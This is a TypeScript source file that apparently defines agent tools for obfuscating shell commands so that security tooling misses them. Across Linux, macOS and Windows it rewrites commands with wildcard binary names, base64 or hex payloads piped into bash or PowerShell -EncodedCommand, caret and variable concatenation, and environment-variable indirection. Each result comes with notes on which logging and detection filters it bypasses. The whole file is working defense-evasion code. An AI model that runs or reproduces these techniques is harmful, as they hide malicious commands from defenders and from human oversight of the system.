import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform, UnifiedLOLEntry } from "../schema/unified-entry.js";

// ━━━ Helpers ━━━

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

function deduplicateByBinary(entries: UnifiedLOLEntry[]): UnifiedLOLEntry[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: UnifiedLOLEntry): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ━━━ Obfuscation Technique Data ━━━

interface ObfuscationResult {
  obfuscated_command: string;
  method_used: string;
  detection_bypass: string[];
  notes: string;
}

function applyGlobObfuscation(command: string, platform: Platform): ObfuscationResult {
  const parts = command.split(/\s+/);
  const binary = parts[0] || "";

  const globPatterns: Record<string, Record<string, string>> = {
    linux: {
      curl: "/u?r/b?n/cu?l",
      wget: "/u?r/b?n/wg?t",
      python: "/u?r/b?n/py?h?n",
      python3: "/u?r/b?n/py?h?n3",
      bash: "/b?n/b?sh",
      sh: "/b?n/s?",
      cat: "/b?n/c?t",
      nc: "/u?r/b?n/n?",
      ncat: "/u?r/b?n/nc?t",
      perl: "/u?r/b?n/pe?l",
      ruby: "/u?r/b?n/ru?y",
      chmod: "/b?n/ch?od",
      chown: "/b?n/ch?wn",
      whoami: "/u?r/b?n/who?mi",
      id: "/u?r/b?n/i?",
    },
    macos: {
      curl: "/u?r/b?n/cu?l",
      python3: "/u?r/b?n/py?h?n3",
      bash: "/b?n/b?sh",
      zsh: "/b?n/z?h",
      sh: "/b?n/s?",
      cat: "/b?n/c?t",
      osascript: "/u?r/b?n/os?script",
      whoami: "/u?r/b?n/who?mi",
    },
    windows: {
      powershell: "p*w*r*s*h*e*l*l",
      cmd: "c?d",
      certutil: "c?rt?til",
      bitsadmin: "b?ts?dmin",
      mshta: "m?h?a",
      regsvr32: "r?gsv?32",
      rundll32: "r?ndl?32",
      whoami: "w?o?mi",
    },
  };

  const platformGlobs = globPatterns[platform] || globPatterns.linux;
  const binaryName = binary.replace(/^.*[\\/]/, "").toLowerCase();
  const globbed = platformGlobs[binaryName] || binary.replace(/[aeiou]/g, "?");
  const rest = parts.slice(1).join(" ");

  return {
    obfuscated_command: rest ? `${globbed} ${rest}` : globbed,
    method_used: "glob_wildcard",
    detection_bypass: [
      "Bypasses static string matching on binary names",
      "Evades simple command-line argument logging filters",
      "Shell resolves glob at runtime, not visible in process args on some platforms",
    ],
    notes: `Replaced binary "${binary}" with glob pattern "${globbed}". Shell will resolve the glob to the actual binary path at execution time.`,
  };
}

function applyEncodeObfuscation(command: string, platform: Platform): ObfuscationResult {
  const b64 = Buffer.from(command).toString("base64");

  const templates: Record<string, string> = {
    linux: `echo '${b64}' | base64 -d | bash`,
    macos: `echo '${b64}' | base64 -D | bash`,
    windows: `powershell -EncodedCommand ${Buffer.from(command, "utf8").toString("base64")}`,
  };

  const hexEncoded = Buffer.from(command).toString("hex");
  const hexTemplate: Record<string, string> = {
    linux: `echo '${hexEncoded}' | xxd -r -p | bash`,
    macos: `echo '${hexEncoded}' | xxd -r -p | bash`,
    windows: `cmd /c "echo ${hexEncoded} | certutil -decodehex - - 1 | cmd"`,
  };

  return {
    obfuscated_command: templates[platform] || templates.linux,
    method_used: "base64_encode",
    detection_bypass: [
      "Original command not visible in process arguments",
      "Bypasses command-line keyword filters",
      "Encoded payload only decoded at runtime",
      `Alternative hex encoding: ${hexTemplate[platform] || hexTemplate.linux}`,
    ],
    notes: `Command encoded as base64: "${b64}". The decoded command is piped to the shell interpreter.`,
  };
}

function applyAltBinaryObfuscation(command: string, platform: Platform): ObfuscationResult {
  const parts = command.split(/\s+/);
  const binary = parts[0] || "";
  const binaryName = binary.replace(/^.*[\\/]/, "").toLowerCase();
  const rest = parts.slice(1).join(" ");

  const alternatives: Record<string, Record<string, string[]>> = {
    linux: {
      python: ["python3.11", "python3.12", "/usr/bin/python3.11"],
      python3: ["python3.11", "python3.12", "/usr/bin/python3.11"],
      curl: ["/usr/bin/curl", "curl.real"],
      bash: ["/usr/bin/bash", "/bin/sh", "dash", "zsh"],
      sh: ["dash", "bash", "zsh"],
      nc: ["ncat", "netcat", "/usr/bin/ncat"],
      nmap: ["/usr/bin/nmap", "/usr/local/bin/nmap"],
      wget: ["/usr/bin/wget", "wget2"],
      perl: ["perl5.38.0", "/usr/bin/perl5.38.0"],
      ruby: ["ruby3.2", "/usr/bin/ruby3.2"],
    },
    macos: {
      python3: ["python3.12", "/usr/local/bin/python3.12", "/opt/homebrew/bin/python3"],
      curl: ["/usr/bin/curl"],
      bash: ["/bin/zsh", "/bin/sh", "dash"],
      nc: ["ncat", "/usr/bin/nc"],
    },
    windows: {
      powershell: ["pwsh", "powershell.exe", "pwsh.exe", "%SystemRoot%\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe"],
      cmd: ["cmd.exe", "%COMSPEC%"],
      certutil: ["certutil.exe", "%SystemRoot%\\System32\\certutil.exe"],
      bitsadmin: ["bitsadmin.exe"],
      mshta: ["mshta.exe"],
    },
  };

  const platformAlts = alternatives[platform] || alternatives.linux;
  const alts = platformAlts[binaryName];

  if (!alts || alts.length === 0) {
    return {
      obfuscated_command: command,
      method_used: "alt_binary",
      detection_bypass: ["No known alternative binaries for this command"],
      notes: `No alternative binary names found for "${binaryName}" on ${platform}.`,
    };
  }

  const chosen = alts[0];

  return {
    obfuscated_command: rest ? `${chosen} ${rest}` : chosen,
    method_used: "alt_binary",
    detection_bypass: [
      "Uses version-specific or full-path binary name to evade detection rules",
      "Many detection signatures only match common short names",
      `Available alternatives: ${alts.join(", ")}`,
    ],
    notes: `Replaced "${binary}" with alternative "${chosen}". Detection rules often only match the common binary name.`,
  };
}

function applyStringConcatObfuscation(command: string, platform: Platform): ObfuscationResult {
  if (platform === "windows") {
    const parts = command.split(/\s+/);
    const binary = parts[0] || "";
    const concatBinary = binary.split("").join("^");
    const rest = parts.slice(1).join(" ");

    return {
      obfuscated_command: `cmd /c "se^t cmd=${rest}&& ${concatBinary} %cmd%"`,
      method_used: "string_concat_caret",
      detection_bypass: [
        "Caret insertion breaks static string matching in cmd.exe",
        "Command reconstructed at runtime by cmd interpreter",
        "Evades command-line logging keyword filters",
      ],
      notes: `Windows cmd.exe ignores carets (^) as escape characters. The command is split and reassembled at runtime.`,
    };
  }

  // Linux/macOS: Use variable concatenation
  const parts = command.split(/\s+/);
  const binary = parts[0] || "";
  const rest = parts.slice(1).join(" ");

  const half1 = binary.substring(0, Math.ceil(binary.length / 2));
  const half2 = binary.substring(Math.ceil(binary.length / 2));

  return {
    obfuscated_command: `a='${half1}';b='${half2}';$a$b ${rest}`,
    method_used: "string_concat_variable",
    detection_bypass: [
      "Binary name split across shell variables",
      "Process arguments show variable names, not actual command",
      "Static analysis cannot resolve concatenated binary name",
    ],
    notes: `Binary "${binary}" split into variables a="${half1}" and b="${half2}". Shell concatenates and executes at runtime.`,
  };
}

function applyEnvVarObfuscation(command: string, platform: Platform): ObfuscationResult {
  if (platform === "windows") {
    const parts = command.split(/\s+/);
    const binary = parts[0] || "";
    const rest = parts.slice(1).join(" ");

    return {
      obfuscated_command: `cmd /c "set __x=${binary}&& set __y=${rest}&& call %__x% %__y%"`,
      method_used: "env_var_substitution",
      detection_bypass: [
        "Command stored in environment variables, not visible in initial process args",
        "Delayed expansion hides true command from static analysis",
        "Environment variable names are arbitrary and non-suspicious",
      ],
      notes: `Binary and arguments stored in environment variables __x and __y. The 'call' statement expands and executes them.`,
    };
  }

  // Linux/macOS
  const parts = command.split(/\s+/);
  const binary = parts[0] || "";
  const rest = parts.slice(1).join(" ");
  const b64Binary = Buffer.from(binary).toString("base64");

  return {
    obfuscated_command: `export __LOL=$(echo '${b64Binary}' | base64 -d); $__LOL ${rest}`,
    method_used: "env_var_substitution",
    detection_bypass: [
      "Binary name stored as base64 in environment variable",
      "Decoded and executed via variable expansion",
      "Process audit may only see variable reference, not resolved binary",
    ],
    notes: `Binary "${binary}" is base64-encoded into an environment variable, then decoded and executed via shell expansion.`,
  };
}

// ━━━ Tools ━━━

const obfuscate_glob: ToolDef = {
  name: "obfuscate_glob",
  description: "Obfuscate a command using glob/wildcard patterns to evade static binary name matching (ATT&CK T1027, T1036)",
  schema: {
    command: z.string().describe("The command to obfuscate (e.g., 'curl http://example.com/payload')"),
    platform: z.enum(["linux", "windows", "macos"]).describe("Target platform for the obfuscation technique"),
  },
  async execute(args: { command: string; platform: Platform }, ctx: ToolContext): Promise<ToolResult> {
    const result = applyGlobObfuscation(args.command, args.platform);

    // Search KB for defense evasion and obfuscation entries
    const kbEntries = [
      ...ctx.knowledgeBase.searchByFunction("defense_evasion", args.platform),
      ...ctx.knowledgeBase.searchByFunction("encode_decode", args.platform),
    ];
    const unique = deduplicateByBinary(kbEntries);

    return json({
      original_command: args.command,
      platform: args.platform,
      ...result,
      attck: ["T1027", "T1036"],
      knowledgeBaseMatches: unique.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

const obfuscate_encode: ToolDef = {
  name: "obfuscate_encode",
  description: "Obfuscate a command using base64 or hex encoding to hide the payload content (ATT&CK T1027, T1036)",
  schema: {
    command: z.string().describe("The command to encode"),
    platform: z.enum(["linux", "windows", "macos"]).describe("Target platform for the encoding technique"),
  },
  async execute(args: { command: string; platform: Platform }, ctx: ToolContext): Promise<ToolResult> {
    const result = applyEncodeObfuscation(args.command, args.platform);

    const kbEntries = [
      ...ctx.knowledgeBase.searchByFunction("encode_decode", args.platform),
      ...ctx.knowledgeBase.searchByFunction("defense_evasion", args.platform),
    ];
    const unique = deduplicateByBinary(kbEntries);

    return json({
      original_command: args.command,
      platform: args.platform,
      ...result,
      attck: ["T1027", "T1036"],
      knowledgeBaseMatches: unique.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

const obfuscate_alt_binary: ToolDef = {
  name: "obfuscate_alt_binary",
  description: "Replace a binary with an alternative name or versioned path to evade detection (ATT&CK T1027, T1036)",
  schema: {
    command: z.string().describe("The command containing the binary to replace"),
    platform: z.enum(["linux", "windows", "macos"]).describe("Target platform for alternative binary lookup"),
  },
  async execute(args: { command: string; platform: Platform }, ctx: ToolContext): Promise<ToolResult> {
    const result = applyAltBinaryObfuscation(args.command, args.platform);

    // Look up the binary in KB
    const parts = args.command.split(/\s+/);
    const binaryName = (parts[0] || "").replace(/^.*[\\/]/, "");
    const kbEntries = ctx.knowledgeBase.lookupBinary(binaryName, args.platform);

    return json({
      original_command: args.command,
      platform: args.platform,
      ...result,
      attck: ["T1027", "T1036"],
      knowledgeBaseMatches: kbEntries.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

const obfuscate_string_concat: ToolDef = {
  name: "obfuscate_string_concat",
  description: "Obfuscate a command using string concatenation techniques to split the binary name (ATT&CK T1027, T1036)",
  schema: {
    command: z.string().describe("The command to obfuscate with string concatenation"),
    platform: z.enum(["linux", "windows", "macos"]).describe("Target platform (Windows uses caret insertion, Unix uses variable concat)"),
  },
  async execute(args: { command: string; platform: Platform }, ctx: ToolContext): Promise<ToolResult> {
    const result = applyStringConcatObfuscation(args.command, args.platform);

    const kbEntries = [
      ...ctx.knowledgeBase.searchByFunction("command_execution", args.platform),
      ...ctx.knowledgeBase.searchByFunction("defense_evasion", args.platform),
    ];
    const unique = deduplicateByBinary(kbEntries);

    return json({
      original_command: args.command,
      platform: args.platform,
      ...result,
      attck: ["T1027", "T1036"],
      knowledgeBaseMatches: unique.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

const obfuscate_env_var: ToolDef = {
  name: "obfuscate_env_var",
  description: "Obfuscate a command by storing components in environment variables and expanding at runtime (ATT&CK T1027, T1036)",
  schema: {
    command: z.string().describe("The command to obfuscate using environment variable substitution"),
    platform: z.enum(["linux", "windows", "macos"]).describe("Target platform for env var technique"),
  },
  async execute(args: { command: string; platform: Platform }, ctx: ToolContext): Promise<ToolResult> {
    const result = applyEnvVarObfuscation(args.command, args.platform);

    const kbEntries = [
      ...ctx.knowledgeBase.searchByFunction("defense_evasion", args.platform),
      ...ctx.knowledgeBase.searchByFunction("command_execution", args.platform),
    ];
    const unique = deduplicateByBinary(kbEntries);

    return json({
      original_command: args.command,
      platform: args.platform,
      ...result,
      attck: ["T1027", "T1036"],
      knowledgeBaseMatches: unique.slice(0, 10).map(summarizeKbEntry),
    });
  },
};

export const obfuscateTools: ToolDef[] = [obfuscate_glob, obfuscate_encode, obfuscate_alt_binary, obfuscate_string_concat, obfuscate_env_var];
